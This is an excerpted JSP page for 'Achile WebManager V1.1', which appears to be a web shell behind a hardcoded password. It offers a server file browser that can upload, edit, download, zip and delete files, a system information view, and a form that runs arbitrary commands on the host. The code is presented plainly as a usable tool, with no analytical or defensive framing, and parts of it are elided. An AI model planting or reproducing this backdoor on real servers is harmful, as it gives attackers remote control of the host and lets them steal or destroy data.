...
<%!
private static final String PASS = "asdQEEQ!#";//password
...
<title>Achile WebManager V1.1 Login</title>
<style type="text/css">
body{
font-size:12px;
color:#464646;
...
Enter Password：<input type="password" name="pass" /><input name="" type="submit" value="Login" />
</form>
<%
String info=Util.getRequestStringVal(request, "info");
if("false".equals(info)){
	Util.print(out,2,"Wrong Pass!");
}
%>
</div>
</body>
...
<div>
	...
	<!--menue-->
	<div id="menue">
	<a href="javascript:void(0)">Achile V1.1</a><a href="javascript:post('<%=shellPath%>',{m:'EnvsInfo'})" name="EnvsInfo">Information</a><a href="javascript:post('<%=shellPath%>',{m:'FileManage'})" name="FileManage">Browser</a><a href="javascript:post('<%=shellPath%>',{m:'CMDS'})" name="CMDS">CMD</a>
	</div>
	<!--content-->
	<div id="content">
		<%
		...
		<div id="FileManage">
			<div id="fileListTop">
				<div>
					<form action="<%=shellPath%>" method="post" enctype="application/x-www-form-urlencoded" name="turnDir">Path：<input style="width:390px;height:18px" id="currentDir" name="dir" type="text" value="<%=dir%>" /><input value="GO" type="button" onclick="goTargetPath(0)" /></form><form action="<%=shellPath %>?m=FileManage&do=upload&path=<%=dir%>" method="post" enctype="multipart/form-data">
				</div>
				<div>
				&nbsp;&nbsp;Select File ：<input name="path" type="hidden" value="<%=dir%>"/><input name="m" value="FileManage" type="hidden" /><input name="do" value="upload" type="hidden" /><input name="upFile" type="file" /><input type="submit" value="Upload" />&nbsp;&nbsp;<input value="Go to" onclick="goTargetPath(1)" type="button" /></form>
				</div>
			</div>
			<!--磁盘列表-->
			<div id="diskInfo">
				...
				if(f.exists()){
					for(int i=0;i<rfs.length;i++){
						...
						%>
						<a href="javascript:post('<%=shellPath%>',{'m':'FileManage','dir':'<%=Util.formatPath(cf.getPath())%>'})">ROOT(<%=cf.getPath() %>)</a>
						<%
				}
				%>
				<a href="javascript:post('<%=shellPath%>',{'m':'FileManage','dir':'<%=webRootPath%>'})">|Web RooT|</a><a href="javascript:newFile('1','<%=dir%>')">|New Dir|</a><a href="javascript:newFile('0','<%=dir%>')">|New File|</a>
			</div>
			<!--文件目录列表-->
			<div id="filesList">
			<div><dd class="fileName">File Name</dd><dd class="fileUpdateTime">File Date</dd><dd class="filePermis">Permission</dd><dd class="fileSize">Size</dd><dd class="fileDo">Action</dd></div>
			<%
			//显示文件列表
				...
				for(int i=0;i<fs.length;i++){
					...
					<dd class="fileDo">
					<%if(cf.isFile()){%><a href="javascript:post('<%=shellPath%>',{'m':'FileManage','do':'editFile','path':'<%=currentPath%>'})">Edit</a><%}%>
					<%if(cf.isFile()){%><a href="javascript:post('<%=shellPath%>',{'m':'FileManage','do':'downFile','path':'<%=currentPath%>'})">Download</a><%}%>
					<!-- <a href="#">复制</a>
					<a href="#">属性</a> -->
					<a href="javascript:packFiles('<%=currentPath%>')">Zip</a>
					<a href="javascript:post('<%=shellPath%>',{m:'FileManage',do:'delete',path:'<%=currentPath%>'})">Delete</a>
					</dd></div>
			...
			<!--文件目录列表end-->
			<!--文件信息结束-->
			<div id="filesInfo"><a href="javascript:checkAll()">Check All</a><a href="javascript:revsAll()">Uncheck All</a><a href="javascript:delSelectFiles('<%=dir %>')">Delete Selected</a><a href="javascript:packSelectFiles('<%=dir%>')">Zip Selected</a> (<%=dirCount %>) Dir Count  ，(<%=fCount %>) File Count</div>
			<!--文件结束-->
		</div>
		<!--文件管理结束-->
		...
		<div id="CMDS">
			<form action="<%=shellPath %>" method="post" enctype="application/x-www-form-urlencoded">
				CMD：<input name="cmd" value="<%=cmd%>" style="width:300px" type="text" /><input name="m" value="CMDS" type="hidden" /><input value="Execute" type="submit" />
			</form>
